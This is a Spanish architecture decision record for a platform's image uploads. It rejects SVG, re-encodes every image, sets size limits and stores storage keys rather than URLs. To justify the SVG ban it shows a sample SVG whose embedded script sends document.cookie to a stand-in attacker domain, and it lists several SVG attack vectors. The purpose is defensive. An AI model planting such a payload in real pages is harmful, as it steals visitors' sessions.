# ADR-0017 — Imágenes subidas: nada de SVG, todo reprocesado

- **Estado:** ✅ Vigente
- **Fecha:** 2026-08-05

## Contexto

Los dueños de servidor suben un icono y un banner. La petición original incluía
**iconos en SVG** y **banners en GIF animado**.

## Decisión 1 — SVG rechazado, sin excepciones

Un SVG no es una imagen: es un documento XML que **puede contener JavaScript**.

```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://atacante.com?c='+document.cookie)</script>
</svg>
```

Si eso se sirve desde nuestro dominio, el navegador lo ejecuta **con la sesión
del visitante**. Un dueño de servidor podría robar las cuentas de cualquiera que
mire su ficha. Es XSS almacenado, y el vector más limpio que existe.

Sanear SVG es posible pero es una carrera perdida: la lista de vectores
(`<script>`, `onload`, `<foreignObject>`, `xlink:href`, entidades externas…)
crece con cada versión de cada navegador.

**Aceptado:** PNG, JPEG, WebP. **Rechazado:** SVG, y cualquier cosa que no sea
una imagen de mapa de bits.

## Decisión 2 — Toda imagen se reprocesa

No basta con comprobar la extensión ni la cabecera. Un archivo puede ser un PNG
válido *y además* llevar cargas útiles en sus metadatos.

Toda imagen se **decodifica y se vuelve a codificar** en el servidor. Lo que se
guarda es el resultado de ese reprocesado, nunca el archivo original. Efectos:

- Cualquier cosa incrustada que no fueran píxeles desaparece
- Las dimensiones quedan acotadas
- Los metadatos (incluida la **geolocalización** de las fotos de móvil, que la
  gente sube sin saberlo) se pierden

## Decisión 3 — Límites de tamaño

| | Máximo entrada | Resultado guardado |
|---|---|---|
| Icono | 2 MB | PNG 128×128 |
| Banner estático | 4 MB | WebP o PNG, máx. 1200×300 |
| Banner GIF animado | **1 MB** | Se conserva tal cual, validado |

El límite del GIF es agresivo a propósito. Un GIF animado "normal" pesa entre 3
y 8 MB; con cinco destacados en la portada serían 40 MB de descarga. En un móvil
con datos, eso es una página que tarda veinte segundos y un visitante que se va.

## Deuda deliberada: conversión de GIF a vídeo

Lo correcto sería convertir el GIF animado a WebP animado o MP4 — de 10 a 20
veces más ligero con la misma animación. Requiere **ffmpeg**, que es una
dependencia de sistema con su propio ciclo de actualizaciones y su superficie de
seguridad.

**Se aplaza** (ADR-0007: deuda deliberada y prudente).

- **Mientras tanto:** el límite de 1 MB mantiene el problema acotado
- **Se paga cuando:** haya suficientes servidores destacados como para que el
  peso de la portada se note, o cuando alguien se queje del límite
- **Responsable:** equipo de plataforma
- **Test que lo vigila:** el límite de 1 MB está en una constante con nombre; el
  día que se suba, este ADR debe revisarse

## Decisión 4 — Se guarda la clave, no la URL

En la base de datos vive `servidores/abc/icono.png`, no
`https://cdn.dominio.com/servidores/abc/icono.png`.

Cambiar de proveedor, de dominio o de CDN con URLs completas guardadas obliga a
migrar toda la tabla. Con claves relativas, es cambiar un prefijo en la
configuración.

## Consecuencias

- Hace falta un puerto `FileStorage` con adaptador local (desarrollo) y R2/S3
  (producción)
- Las imágenes se sirven con `Content-Type` explícito y
  `X-Content-Type-Options: nosniff`, para que el navegador no intente adivinar el
  tipo y acabe ejecutando algo
- Reemplazar una imagen deja la anterior huérfana: hace falta un proceso de
  limpieza, o se paga por bytes que nadie mira
